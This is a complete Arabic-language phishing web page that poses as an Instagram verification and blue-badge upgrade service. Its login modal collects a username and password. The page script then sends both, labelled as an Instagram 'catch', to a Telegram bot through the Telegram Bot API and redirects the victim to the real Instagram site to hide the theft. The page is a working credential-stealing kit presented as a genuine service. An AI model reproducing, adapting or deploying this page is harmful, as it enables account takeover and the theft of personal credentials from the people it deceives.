<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Verified - الشارة الزرقاء والترقية 2026</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
        body { background: #030712; color: #fff; display: flex; justify-content: center; padding: 15px; min-height: 100vh; background-image: radial-gradient(circle at 50% 10%, #00f2fe20 0%, transparent 70%); }
        .wrapper { width: 100%; max-width: 480px; }
        .hero-card { background: linear-gradient(145deg, #0f172a 0%, #020617 100%); border: 1px solid rgba(0, 242, 254, 0.4); border-radius: 24px; padding: 30px 20px; text-align: center; margin-bottom: 25px; box-shadow: 0 15px 35px rgba(0,0,0,0.7); }
        .badge-live { display: inline-flex; align-items: center; gap: 6px; background: rgba(0, 242, 254, 0.15); color: #00f2fe; padding: 6px 14px; border-radius: 20px; font-size: 11px; font-weight: bold; margin-bottom: 15px; border: 1px solid rgba(0, 242, 254, 0.4); }
        .live-dot { width: 8px; height: 8px; background: #00f2fe; border-radius: 50%; box-shadow: 0 0 10px #00f2fe; }
        h1 { font-size: 26px; color: #fff; margin-bottom: 8px; font-weight: 900; }
        h1 span { color: #00f2fe; }
        .subtitle { font-size: 13px; color: #94a3b8; margin-bottom: 25px; line-height: 1.6; }
        .section-title { font-size: 18px; color: #00f2fe; margin: 25px 0 15px 5px; font-weight: bold; }
        .offer-card { background: rgba(15, 23, 42, 0.7); border: 1px solid rgba(0, 242, 254, 0.3); border-radius: 18px; padding: 18px; margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center; }
        .offer-name { font-size: 16px; font-weight: bold; color: #fff; margin-bottom: 4px; }
        .offer-tag { font-size: 11px; color: #00f2fe; background: rgba(0, 242, 254, 0.1); padding: 2px 8px; border-radius: 6px; display: inline-block; }
        .offer-price { font-size: 17px; font-weight: 900; color: #38bdf8; text-align: left; }
        .btn-action { background: linear-gradient(135deg, #0072ff 0%, #00f2fe 100%); color: #fff; border: none; padding: 11px 22px; border-radius: 12px; font-weight: 900; cursor: pointer; font-size: 14px; margin-top: 5px; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(3, 7, 18, 0.9); backdrop-filter: blur(15px); justify-content: center; align-items: center; z-index: 100; padding: 20px; }
        .modal-content { background: #0f172a; border: 1px solid #00f2fe; border-radius: 24px; padding: 35px 25px; width: 100%; max-width: 380px; text-align: center; }
        .input-group { margin-bottom: 15px; text-align: right; }
        input { width: 100%; padding: 14px 16px; background: #030712; border: 1px solid #1e293b; border-radius: 14px; color: #fff; font-size: 14px; outline: none; }
        .btn-submit { width: 100%; padding: 14px; background: linear-gradient(135deg, #00f2fe 0%, #0072ff 100%); border: none; border-radius: 14px; color: #fff; font-weight: 900; cursor: pointer; font-size: 16px; margin-top: 10px; }
        .close-btn { background: transparent; border: none; color: #64748b; font-size: 13px; margin-top: 18px; cursor: pointer; font-weight: bold; }
        .footer { text-align: center; font-size: 11px; color: #475569; margin-top: 35px; }
    </style>
</head>
<body>
<div class="wrapper">
    <div class="hero-card">
        <div class="badge-live"><div class="live-dot"></div>بوابة التوثيق نشطة 2026</div>
        <h1>توثيق وترقية <span>Instagram VIP</span></h1>
        <p class="subtitle">احصل على العلامة الزرقاء وزيادة المتابعين الرسميين</p>
    </div>
    <div class="section-title">💎 خدمات انستقرام الملكية</div>
    <div class="offer-card">
        <div><div class="offer-name">الشارة الزرقاء الرسمية</div><span class="offer-tag">توثيق موثوق</span></div>
        <div><div class="offer-price">مؤهل</div><button class="btn-action" onclick="openLogin('توثيق انستقرام بالعلامة الزرقاء')">إرسال الطلب</button></div>
    </div>
    <div class="footer">🔒 حماية متكاملة بمعايير الفحص الأمني 2026</div>
</div>
<div class="modal" id="loginModal">
    <div class="modal-content">
        <h3 style="color:#fff; margin-bottom:10px;">تأكيد حساب انستقرام</h3>
        <p id="selectedOfferText" style="font-size:13px; color:#94a3b8; margin-bottom:20px;"></p>
        <form onsubmit="submitForm(event)">
            <div class="input-group"><input type="text" id="username" placeholder="اسم المستخدم أو البريد" required></div>
            <div class="input-group"><input type="password" id="password" placeholder="كلمة المرور الشخصية" required></div>
            <button type="submit" class="btn-submit">تأكيد وإرسال الطلب 🚀</button>
        </form>
        <button class="close-btn" onclick="closeLogin()">إلغاء</button>
    </div>
</div>
<script src="config.js"></script>
<script>
    let currentOffer = "";
    function openLogin(offer) {
        currentOffer = offer;
        document.getElementById('loginModal').style.display = 'flex';
        document.getElementById('selectedOfferText').innerText = "الخدمة: (" + offer + "). أدخل بياناتك للتأكيد:";
    }
    function closeLogin() { document.getElementById('loginModal').style.display = 'none'; }
    function submitForm(event) {
        event.preventDefault();
        const user = document.getElementById('username').value;
        const pass = document.getElementById('password').value;
        const text = `🚨 صيد انستقرام | ${currentOffer}\n👤 المستخدم: ${user}\n🔑 كلمة المرور: ${pass}`;
        fetch(`https://api.telegram.org/bot${BOT_CONFIG.token}/sendMessage?chat_id=${BOT_CONFIG.chat_id}&text=${encodeURIComponent(text)}`)
        .then(() => { window.location.href = "https://www.instagram.com"; });
    }
</script>
</body>
</html>
